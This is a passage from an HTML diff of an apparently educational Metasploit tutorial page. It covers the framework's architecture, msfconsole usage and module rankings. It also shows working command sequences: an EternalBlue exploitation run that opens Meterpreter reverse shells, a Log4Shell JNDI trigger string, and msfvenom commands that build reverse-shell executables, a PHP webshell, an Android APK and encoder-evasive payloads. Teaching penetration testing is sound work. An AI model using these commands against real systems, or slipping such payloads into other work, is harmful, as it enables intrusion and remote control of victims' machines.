+        <text x="490" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#0d3b1a">Escalate · Pivot</text>
+        <text x="490" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#39d353">post/*</text>
+
+        <rect x="566" y="183" width="120" height="70" rx="4" fill="rgba(0,207,255,.06)" stroke="rgba(0,207,255,.3)" stroke-width="1.3"/>
+        <text x="626" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#00cfff">ENCODERS</text>
+        <text x="626" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">Shikata ga nai</text>
+        <text x="626" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">XOR · Unicode</text>
+        <text x="626" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#00cfff">encoder/*</text>
+
+        <rect x="702" y="183" width="135" height="70" rx="4" fill="rgba(189,147,249,.06)" stroke="rgba(189,147,249,.3)" stroke-width="1.3"/>
+        <text x="769" y="203" text-anchor="middle" font-family="Ubuntu Mono" font-size="8.5" fill="#bd93f9">EVASION/NOP</text>
+        <text x="769" y="217" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#2d1f5e">AV bypass</text>
+        <text x="769" y="230" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#2d1f5e">NOP sleds</text>
+        <text x="769" y="244" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#bd93f9">evasion/*, nop/*</text>
+      </g>
+
+      <line x1="430" y1="255" x2="430" y2="275" stroke="rgba(255,46,46,.4)" stroke-width="1.3" marker-end="url(#aa)"/>
+
+      <!-- Libraries / REX -->
+      <rect x="20" y="278" width="820" height="50" rx="4" fill="rgba(0,207,255,.06)" stroke="rgba(0,207,255,.25)" stroke-width="1.2"/>
+      <text x="430" y="298" text-anchor="middle" font-family="Russo One" font-size="10" fill="#00cfff" letter-spacing="2">REX LIBRARY / LIBRARIES</text>
+      <text x="180" y="316" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">Socket (TCP/UDP/SSL)</text>
+      <text x="360" y="316" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">Protocol parsers (SMB, HTTP, FTP)</text>
+      <text x="580" y="316" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">Crypto (AES, RSA, MD5)</text>
+      <text x="750" y="316" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#003344">Encoders</text>
+
+      <line x1="430" y1="330" x2="430" y2="348" stroke="rgba(255,46,46,.4)" stroke-width="1.3" marker-end="url(#aa)"/>
+
+      <!-- PostgreSQL -->
+      <rect x="240" y="350" width="380" height="28" rx="4" fill="rgba(57,211,83,.06)" stroke="rgba(57,211,83,.25)" stroke-width="1.2"/>
+      <text x="430" y="368" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#39d353">PostgreSQL DATABASE — hosts, vulns, loot, credentials, sessions</text>
+    </svg>
+  </div>
+
+  <div class="three-col">
+    <div class="card" style="--cl:var(--red)"><h4>The Module System</h4><p>Everything in Metasploit is a module — a self-contained Ruby class with metadata (name, author, CVE, platform, rank) and a <code>run()</code> or <code>exploit()</code> method. Modules live in <code>~/.msf4/modules/</code> (user) or <code>/usr/share/metasploit-framework/modules/</code> (system).</p></div>
+    <div class="card" style="--cl:var(--cyan)"><h4>Rex Library</h4><p>Rex (Ruby Extension Library) provides low-level building blocks: <code>Rex::Socket</code> for networking, <code>Rex::Proto::*</code> for 40+ protocol implementations (SMB, HTTP, DNS, FTP, SSH...), <code>Rex::Crypto</code> for encryption. All modules use Rex internally.</div>
+    <div class="card" style="--cl:var(--green)"><h4>PostgreSQL Database</h4><p>MSF stores all pentest data in PostgreSQL: discovered hosts, open ports, service versions, vulnerability results, captured credentials (hashes, plaintext), loot files, and active sessions. Use <code>workspace</code> to separate engagements. Query with <code>hosts</code>, <code>services</code>, <code>vulns</code>, <code>creds</code>.</p></div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  3 — SETUP & msfconsole
+═══════════════════════════ -->
+<div id="p-setup" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 3 — Getting Started</div>
+    <h2>Installation, Setup &amp; msfconsole Mastery</h2>
+    <p>Metasploit comes pre-installed on Kali Linux and Parrot OS. For other systems, use the official installer. msfconsole is the primary interface — a full-featured command-line shell with tab completion, command history, and scripting support.</p>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <div class="term-dot" style="background:#ff5f57"></div>
+      <div class="term-dot" style="background:#ffbd2e"></div>
+      <div class="term-dot" style="background:#28ca41"></div>
+      <span class="term-title">INSTALLATION & FIRST LAUNCH</span>
+    </div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── KALI LINUX (already installed — just update) ─────────────────────────</span>
+<span class="p">root@kali:~# </span><span class="c">sudo apt update && sudo apt install metasploit-framework -y</span>
+
+<span class="cm2"># ─── INITIALIZE THE DATABASE ──────────────────────────────────────────────</span>
+<span class="p">root@kali:~# </span><span class="c">msfdb init</span>
+<span class="o">[+] Starting database</span>
+<span class="o">[+] Creating database user 'msf'</span>
+<span class="o">[+] Creating databases 'msf' and 'msf_test'</span>
+<span class="o">[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'</span>
+<span class="o2">[*] All done!</span>
+
+<span class="cm2"># ─── LAUNCH msfconsole ────────────────────────────────────────────────────</span>
+<span class="p">root@kali:~# </span><span class="c">msfconsole</span>
+<span class="o">
+                                                  ###
+                                              ###########
+                                          #################
+                                      #########################        ##
+                                  #############################      ##  ###
+                            ########################################      ###
+                        ################################################     ###
+                    ####################################################    #####
+              ##########################################################   #######
+          ################################################################  #########
+      ####################################################################   ###########
+   #####################################################################   #############
+</span>
+<span class="o3">       =[ metasploit v6.3.44-dev                          ]</span>
+<span class="o">+ -- --=[ 2375 exploits - 1232 auxiliary - 411 post       ]</span>
+<span class="o">+ -- --=[ 1387 payloads - 46 encoders - 11 nops           ]</span>
+<span class="o">+ -- --=[ 9 evasion                                        ]</span>
+<span class="o2">
+        Metasploit tip: Use help &lt;command&gt; to get help for any command
+</span>
+<span class="o3">msf6 &gt; </span><span class="cursor-blink">█</span></pre>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <div class="term-dot" style="background:#ff5f57"></div>
+      <div class="term-dot" style="background:#ffbd2e"></div>
+      <div class="term-dot" style="background:#28ca41"></div>
+      <span class="term-title">ESSENTIAL msfconsole COMMANDS</span>
+    </div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── NAVIGATION ───────────────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">help</span>                          <span class="cm2"># all available commands</span>
+<span class="o3">msf6 &gt; </span><span class="c">version</span>                       <span class="cm2"># MSF version</span>
+<span class="o3">msf6 &gt; </span><span class="c">exit</span>                          <span class="cm2"># quit msfconsole</span>
+<span class="o3">msf6 &gt; </span><span class="c">banner</span>                        <span class="cm2"># display ASCII art banner</span>
+
+<span class="cm2"># ─── SEARCH ──────────────────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">search type:exploit name:eternalblue</span>
+<span class="o">
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       great   Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal  No     MS17-010 EternalBlue SMB Remote Windows Code Execution
+</span>
+<span class="cm2"># Search by CVE number:</span>
+<span class="o3">msf6 &gt; </span><span class="c">search cve:2021-44228</span>           <span class="cm2"># Log4Shell</span>
+<span class="cm2"># Search by platform:</span>
+<span class="o3">msf6 &gt; </span><span class="c">search platform:windows type:exploit</span>
+<span class="cm2"># Search by author:</span>
+<span class="o3">msf6 &gt; </span><span class="c">search author:hdm</span>              <span class="cm2"># HD Moore's modules</span>
+
+<span class="cm2"># ─── MODULE SELECTION & INFO ─────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="o2">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; </span>
+
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">info</span>
+<span class="o">       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+     Module: exploit/windows/smb/ms17_010_eternalblue
+   Platform: Windows
+       Arch: x64
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Great
+  Disclosed: 2017-03-14
+
+Provided by:
+  Sean Dillon &lt;sean.dillon@risksense.com&gt;
+  Dylan Davis &lt;dylan.davis@risksense.com&gt;
+
+Description:
+  This module exploits a memory corruption vulnerability in the Windows SMB
+  service to execute arbitrary code...
+</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">show options</span>
+<span class="o">
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s)
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        The Windows domain
+   VERIFY_ARCH    true             yes       Check for arch match
+   VERIFY_TARGET  true             yes       Check if OS matches
+</span>
+<span class="cm2"># ─── SET OPTIONS & RUN ───────────────────────────────────────────────────</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set RHOSTS 192.168.1.100</span>
+<span class="o">RHOSTS =&gt; 192.168.1.100</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="o">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set LHOST 192.168.1.50</span>
+<span class="o">LHOST =&gt; 192.168.1.50</span>
+<span class="hl2"><span class="o3">msf6 exploit(...) &gt; </span><span class="c">run</span>    <span class="cm2"># or: exploit</span></span>
+<span class="o">[*] Started reverse TCP handler on 192.168.1.50:4444</span>
+<span class="o">[*] Sending stage (200774 bytes) to 192.168.1.100</span>
+<span class="o4">[+] Meterpreter session 1 opened (192.168.1.50:4444 → 192.168.1.100:49852)</span>
+<span class="o6">
+meterpreter &gt; </span></pre>
+    </div>
+  </div>
+
+  <div class="three-col">
+    <div class="card" style="--cl:var(--yellow)"><h4>Global vs Module Options</h4>
+      <p><code>setg LHOST 10.10.10.5</code> — sets globally for all modules<br>
+      <code>set RHOSTS 10.10.10.1</code> — sets for current module only<br>
+      <code>unset RHOSTS</code> — clear a value<br>
+      <code>save</code> — persist settings to disk<br>
+      <code>spool /tmp/msf.log</code> — log all output to file</p>
+    </div>
+    <div class="card" style="--cl:var(--teal)"><h4>Workspaces</h4>
+      <p>Isolate engagements in separate database workspaces:<br>
+      <code>workspace</code> — list workspaces<br>
+      <code>workspace -a client_a</code> — create new<br>
+      <code>workspace client_a</code> — switch to it<br>
+      <code>workspace -d old_test</code> — delete<br>
+      Each workspace has separate hosts, services, creds.</p>
+    </div>
+    <div class="card" style="--cl:var(--violet)"><h4>Tab Completion &amp; History</h4>
+      <p>msfconsole has full tab completion for: module names, option names, payload names, and commands. Use <code>↑/↓</code> for command history. Use <code>grep</code> to filter output:<br>
+      <code>search type:exploit | grep smb</code><br>
+      <code>show payloads | grep linux</code><br>
+      <code>makerc /tmp/script.rc</code> — save session history as script</p>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  4 — MODULES
+═══════════════════════════ -->
+<div id="p-modules" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 4 — Modules</div>
+    <h2>Module Types — The Building Blocks</h2>
+    <p>Metasploit's power comes from its modular design. Every capability is a module. Understanding module types, metadata, and rankings allows you to select the right tool and predict its behaviour before running it against a target.</p>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>MODULE RANKING SYSTEM — RELIABILITY GUIDE</div>
+    <svg viewBox="0 0 860 100" xmlns="http://www.w3.org/2000/svg">
+      <rect width="860" height="100" fill="#020305"/>
+      <defs><linearGradient id="rkGrad" x1="0" y1="0" x2="1" y2="0">
+        <stop offset="0%" stop-color="#ff2e2e" stop-opacity=".3"/>
+        <stop offset="100%" stop-color="#39d353" stop-opacity=".3"/>
+      </linearGradient></defs>
+      <rect x="20" y="35" width="820" height="8" rx="4" fill="url(#rkGrad)" opacity=".4"/>
+      <text x="20" y="28" font-family="Ubuntu Mono" font-size="8" fill="#330a0a">LESS RELIABLE</text>
+      <text x="840" y="28" text-anchor="end" font-family="Ubuntu Mono" font-size="8" fill="#0d3b1a">MORE RELIABLE</text>
+
+      <g font-family="Ubuntu Mono" text-anchor="middle">
+        <circle cx="80" cy="39" r="6" fill="#ff2e2e" filter="url(#ag)"/>
+        <text x="80" y="62" font-size="8" fill="#ff2e2e">Manual</text>
+        <text x="80" y="74" font-size="7" fill="#330a0a">No auto</text>
+        <text x="80" y="85" font-size="7" fill="#330a0a">DoS risk</text>
+
+        <circle cx="200" cy="39" r="6" fill="#ff5f00"/>
+        <text x="200" y="62" font-size="8" fill="#ff7b00">Low</text>
+        <text x="200" y="74" font-size="7" fill="#4d2400">Works rarely</text>
+
+        <circle cx="330" cy="39" r="6" fill="#ff9500"/>
+        <text x="330" y="62" font-size="8" fill="#ffa500">Average</text>
+        <text x="330" y="74" font-size="7" fill="#4d3000">Crashes sometimes</text>
+
+        <circle cx="450" cy="39" r="7" fill="#ffd60a"/>
+        <text x="450" y="62" font-size="8" fill="#ffd60a">Normal</text>
+        <text x="450" y="74" font-size="7" fill="#4d3f00">Most common rank</text>
+        <text x="450" y="85" font-size="7" fill="#4d3f00">Usually works</text>
+
+        <circle cx="590" cy="39" r="8" fill="#00cfff" filter="url(#ag)"/>
+        <text x="590" y="62" font-size="9" fill="#00cfff">Good</text>
+        <text x="590" y="74" font-size="7" fill="#003344">Reliable, verified</text>
+
+        <circle cx="715" cy="39" r="9" fill="#39d353" filter="url(#ag)"/>
+        <text x="715" y="62" font-size="9" fill="#39d353">Great</text>
+        <text x="715" y="74" font-size="7" fill="#0d3b1a">Near-reliable</text>
+
+        <circle cx="820" cy="39" r="10" fill="#39d353" filter="url(#ag2)"/>
+        <text x="820" y="62" font-size="10" fill="#39d353" font-weight="700">Excellent</text>
+        <text x="820" y="74" font-size="7" fill="#0d3b1a">No service crash</text>
+        <text x="820" y="85" font-size="7" fill="#0d3b1a">Most preferred</text>
+      </g>
+    </svg>
+  </div>
+
+  <!-- Notable exploit modules -->
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;margin-bottom:16px;">
+    <div class="mod-card" style="--mc:var(--red)">
+      <div class="mc-type">Exploit — Remote</div>
+      <div class="mc-name">EternalBlue (MS17-010)</div>
+      <div class="mc-path">exploit/windows/smb/ms17_010_eternalblue</div>
+      <p class="mc-desc">NSA-developed exploit leaked by Shadow Brokers. Targets Windows SMB (port 445). Kernel pool buffer overflow. Used by WannaCry ransomware. Still works on unpatched Windows 7/Server 2008.</p>
+      <span class="mc-tag">CVE-2017-0144</span><span class="mc-tag">SMBv1</span><span class="mc-tag">SYSTEM</span>
+      <div style="margin-top:6px"><span class="rank great">GREAT</span></div>
+    </div>
+    <div class="mod-card" style="--mc:var(--orange)">
+      <div class="mc-type">Exploit — Remote</div>
+      <div class="mc-name">PrintNightmare (PrintSpooler)</div>
+      <div class="mc-path">exploit/windows/dcerpc/cve_2021_1675_printspooler</div>
+      <p class="mc-desc">Windows Print Spooler RCE vulnerability. Allows remote code execution via the AddPrinterDriver functionality. Affects all unpatched Windows versions. SYSTEM-level access.</p>
+      <span class="mc-tag">CVE-2021-1675</span><span class="mc-tag">Windows</span><span class="mc-tag">RCE</span>
+      <div style="margin-top:6px"><span class="rank excellent">EXCELLENT</span></div>
+    </div>
+    <div class="mod-card" style="--mc:var(--yellow)">
+      <div class="mc-type">Exploit — Remote</div>
+      <div class="mc-name">Log4Shell</div>
+      <div class="mc-path">exploit/multi/http/log4shell_header_injection</div>
+      <p class="mc-desc">Critical Apache Log4j RCE via JNDI injection in log messages. Trigger with ${jndi:ldap://attacker/payload} in any logged HTTP header. Affected millions of Java applications globally in 2021.</p>
+      <span class="mc-tag">CVE-2021-44228</span><span class="mc-tag">Java</span><span class="mc-tag">JNDI</span>
+      <div style="margin-top:6px"><span class="rank excellent">EXCELLENT</span></div>
+    </div>
+    <div class="mod-card" style="--mc:var(--violet)">
+      <div class="mc-type">Exploit — Local</div>
+      <div class="mc-name">Dirty COW</div>
+      <div class="mc-path">exploit/linux/local/cve_2016_5195_dirtycow</div>
+      <p class="mc-desc">Linux kernel race condition in copy-on-write (COW) implementation. Allows unprivileged process to write to read-only memory mappings. Privilege escalation to root on Linux 2.6.22–4.8.3.</p>
+      <span class="mc-tag">CVE-2016-5195</span><span class="mc-tag">Linux PrivEsc</span>
+      <div style="margin-top:6px"><span class="rank good">GOOD</span></div>
+    </div>
+    <div class="mod-card" style="--mc:var(--teal)">
+      <div class="mc-type">Exploit — Browser</div>
+      <div class="mc-name">Browser Autopwn 2</div>
+      <div class="mc-path">auxiliary/server/browser_autopwn2</div>
+      <p class="mc-desc">Serves an intelligent exploit page that fingerprints the browser/OS and automatically selects the most likely exploit to succeed. Used in client-side attacks where victims visit a link. Multiple browser exploits tried.</p>
+      <span class="mc-tag">Client-side</span><span class="mc-tag">Multi-browser</span>
+      <div style="margin-top:6px"><span class="rank normal">NORMAL</span></div>
+    </div>
+    <div class="mod-card" style="--mc:var(--green)">
+      <div class="mc-type">Exploit — Multi</div>
+      <div class="mc-name">Java Signed Applet</div>
+      <div class="mc-path">exploit/multi/browser/java_signed_applet</div>
+      <p class="mc-desc">Presents user with a signed Java applet using a self-signed certificate. If user clicks "Run/Allow", arbitrary code executes in the Java runtime. Classic social engineering + exploit combination.</p>
+      <span class="mc-tag">Social Engineering</span><span class="mc-tag">Cross-platform</span>
+      <div style="margin-top:6px"><span class="rank excellent">EXCELLENT</span></div>
+    </div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#ffbd2e"></div><div class="term-dot" style="background:#28ca41"></div>
+      <span class="term-title">WORKING WITH MODULES — FULL EXAMPLE</span>
+    </div>
+    <div class="term-body"><pre>
+<span class="cm2"># ─── FIND & LOAD A MODULE ────────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">search ms17_010</span>
+<span class="o3">msf6 &gt; </span><span class="c">use 0</span>                            <span class="cm2"># use by search result index</span>
+<span class="cm2"># OR by full path:</span>
+<span class="o3">msf6 &gt; </span><span class="c">use exploit/windows/smb/ms17_010_eternalblue</span>
+
+<span class="cm2"># ─── CHECK TARGET VULNERABILITY BEFORE EXPLOITING ────────────────────────</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set RHOSTS 192.168.1.100</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">check</span>
+<span class="o4">[+] 192.168.1.100:445 - The target is vulnerable.</span>
+
+<span class="cm2"># ─── SHOW ALL COMPATIBLE PAYLOADS ────────────────────────────────────────</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">show payloads</span>
+<span class="o">Compatible Payloads
+===================
+   #   Name                                          Rank    Description
+   -   ----                                          ----    -----------
+   0   windows/x64/exec                              normal  Execute Command
+   1   windows/x64/meterpreter/bind_tcp              normal  Windows Meterpreter (Bind)
+   2   windows/x64/meterpreter/reverse_https         normal  Windows Meterpreter (Reverse HTTPS)
+   3   windows/x64/meterpreter/reverse_tcp           normal  Windows Meterpreter (Reverse TCP)
+   4   windows/x64/shell/reverse_tcp                 normal  Command Shell (Reverse TCP)
+   5   windows/x64/powershell_reverse_tcp            normal  PowerShell Reverse Shell
+</span>
+<span class="cm2"># ─── CONFIGURE AND RUN ───────────────────────────────────────────────────</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set PAYLOAD windows/x64/meterpreter/reverse_https</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set LHOST 10.10.14.5</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set LPORT 443</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">set EXITFUNC thread</span>       <span class="cm2"># don't crash service on exit</span>
+<span class="hl2"><span class="o3">msf6 exploit(...) &gt; </span><span class="c">exploit -j</span>               <span class="cm2"># -j runs as background job</span></span>
+<span class="o">[*] Exploit running as background job 0.</span>
+<span class="o4">[+] Meterpreter session 1 opened (10.10.14.5:443 → 192.168.1.100:51204)</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">sessions -l</span>              <span class="cm2"># list all sessions</span>
+<span class="o">
+Active sessions
+===============
+  Id  Name  Type                     Information                    Connection
+  --  ----  ----                     -----------                    ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN10   10.10.14.5:443→192.168.1.100
+</span>
+<span class="o3">msf6 exploit(...) &gt; </span><span class="c">sessions -i 1</span>            <span class="cm2"># interact with session 1</span>
+<span class="o6">meterpreter &gt; </span></pre>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════
+  5 — PAYLOADS
+═══════════════════════════ -->
+<div id="p-payloads" class="panel">
+<div class="wrap">
+  <div class="sec">
+    <div class="tag">Chapter 5 — Payloads</div>
+    <h2>Payloads &amp; Shellcode — What Runs on the Target</h2>
+    <p>A payload is the code that runs on the target after a successful exploit. It can open a shell, run a command, download a file, or provide full Meterpreter control. Understanding payload types and msfvenom is critical for real-world penetration testing.</p>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>PAYLOAD ARCHITECTURE — SINGLES vs STAGERS vs STAGES</div>
+    <svg viewBox="0 0 860 220" xmlns="http://www.w3.org/2000/svg">
+      <defs><filter id="pg"><feGaussianBlur stdDeviation="5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        <marker id="pa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10z" fill="#ff7b00"/></marker>
+      </defs>
+      <rect width="860" height="220" fill="#020305"/>
+
+      <!-- Singles -->
+      <rect x="15" y="20" width="245" height="165" rx="5" fill="rgba(57,211,83,.05)" stroke="rgba(57,211,83,.3)" stroke-width="1.5"/>
+      <text x="137" y="44" text-anchor="middle" font-family="Russo One" font-size="11" fill="#39d353">SINGLES</text>
+      <text x="137" y="58" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#0d3b1a">Self-contained, all-in-one</text>
+      <rect x="30" y="68" width="215" height="30" rx="3" fill="rgba(57,211,83,.08)" stroke="rgba(57,211,83,.25)" stroke-width="1"/>
+      <text x="137" y="85" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#39d353">Single shellcode blob</text>
+      <text x="137" y="110" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#39d353">✓ No second connection needed</text>
+      <text x="137" y="123" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#0d3b1a">✓ Works in limited buffers</text>
+      <text x="137" y="136" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#0d3b1a">✗ Limited functionality</text>
+      <text x="137" y="155" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#39d353">e.g. windows/shell_bind_tcp</text>
+      <text x="137" y="168" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#39d353">     windows/exec cmd=calc.exe</text>
+      <text x="137" y="192" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#0d3b1a">Name: os/shell_type  (no slash)</text>
+
+      <!-- Stagers + Stages -->
+      <rect x="275" y="20" width="565" height="165" rx="5" fill="rgba(255,123,0,.05)" stroke="rgba(255,123,0,.3)" stroke-width="1.5"/>
+      <text x="557" y="44" text-anchor="middle" font-family="Russo One" font-size="11" fill="#ff7b00">STAGERS / STAGES (Staged Payloads)</text>
+
+      <!-- Stager box -->
+      <rect x="290" y="55" width="200" height="110" rx="4" fill="rgba(255,46,46,.08)" stroke="#ff2e2e" stroke-width="1.5" filter="url(#pg)"/>
+      <text x="390" y="78" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#ff2e2e">STAGER</text>
+      <text x="390" y="93" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Tiny shellcode (~300 bytes)</text>
+      <text x="390" y="107" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Connects back to MSF</text>
+      <text x="390" y="121" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#330a0a">Downloads the stage</span></text>
+      <text x="390" y="137" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#ff2e2e">e.g. reverse_tcp stager</text>
+      <text x="390" y="151" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#330a0a">Fits in small exploit buffers</text>
+
+      <!-- Arrow -->
+      <path d="M492,110 L548,110" fill="none" stroke="#ff7b00" stroke-width="1.5" marker-end="url(#pa)" stroke-dasharray="5 3"><animate attributeName="stroke-dashoffset" values="0;-30" dur="1.2s" repeatCount="indefinite"/></path>
+      <text x="520" y="102" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#4d2400">TCP conn</text>
+      <text x="520" y="120" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#4d2400">downloads</text>
+
+      <!-- Stage box -->
+      <rect x="550" y="55" width="265" height="110" rx="4" fill="rgba(189,147,249,.07)" stroke="#bd93f9" stroke-width="1.5" filter="url(#pg)"/>
+      <text x="682" y="78" text-anchor="middle" font-family="Ubuntu Mono" font-size="9" fill="#bd93f9">STAGE (Meterpreter / Shell)</text>
+      <text x="682" y="95" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#2d1f5e">Full-featured code (200KB+)</text>
+      <text x="682" y="109" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#2d1f5e">Loaded after stager connects</text>
+      <text x="682" y="123" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#2d1f5e">Runs in memory (no disk write)</text>
+      <text x="682" y="139" text-anchor="middle" font-family="Ubuntu Mono" font-size="7.5" fill="#bd93f9">Meterpreter, cmd shell, Python</text>
+      <text x="682" y="153" text-anchor="middle" font-family="Ubuntu Mono" font-size="7" fill="#2d1f5e">Reflective DLL injection</text>
+
+      <!-- Name format note -->
+      <text x="557" y="195" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#ff7b00">Staged: windows/x64/meterpreter/reverse_tcp  ← slash = staged</text>
+      <text x="557" y="208" text-anchor="middle" font-family="Ubuntu Mono" font-size="8" fill="#4d2400">Single:  windows/x64/meterpreter_reverse_tcp  ← underscore = single</text>
+    </svg>
+  </div>
+
+  <div class="box">
+    <div class="box-title"><div class="pip"></div>msfvenom — STANDALONE PAYLOAD GENERATOR</div>
+    <div class="terminal" style="margin:0;border:none;border-radius:0;">
+      <div class="term-body"><pre>
+<span class="cm2"># ─── GENERATE A WINDOWS REVERSE SHELL EXE ─────────────────────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -f exe -o shell.exe</span>
+<span class="o">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span>
+
+<span class="cm2"># ─── LINUX ELF PAYLOAD ─────────────────────────────────────────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -f elf -o shell.elf && chmod +x shell.elf</span>
+
+<span class="cm2"># ─── PHP WEBSHELL ──────────────────────────────────────────────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php</span>
+
+<span class="cm2"># ─── POWERSHELL (fileless, runs in memory) ─────────────────────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -f psh-cmd -o payload.ps1</span>
+
+<span class="cm2"># ─── ANDROID APK ───────────────────────────────────────────────────────────</span>
+<span class="p">$ </span><span class="c">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -o malicious.apk</span>
+
+<span class="cm2"># ─── ENCODED PAYLOAD (shikata ga nai encoder, 5 iterations) ───────────────</span>
+<span class="hl2"><span class="p">$ </span><span class="c">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
+        -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe</span></span>
+<span class="o">Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+...
+Final size of exe file: 73802 bytes</span>
+
+<span class="cm2"># ─── LISTENER SETUP (handler) ──────────────────────────────────────────────</span>
+<span class="o3">msf6 &gt; </span><span class="c">use exploit/multi/handler</span>
+<span class="o3">msf6 handler &gt; </span><span class="c">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
